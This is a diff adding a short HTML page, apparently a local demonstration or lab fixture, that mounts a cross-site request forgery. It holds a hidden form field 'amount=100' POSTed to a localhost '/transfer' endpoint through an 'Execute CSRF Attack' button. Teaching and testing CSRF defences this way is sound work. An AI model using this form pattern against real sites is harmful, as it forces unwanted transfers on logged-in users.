@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Malicious Page</title>
+</head>
+<body>
+  <h1>Malicious CSRF Attack</h1>
+  <form action="http://localhost:3000/transfer" method="POST">
+    <input type="hidden" name="amount" value="100">
+    <button type="submit">Execute CSRF Attack</button>
+  </form>
+</body>
+</html>
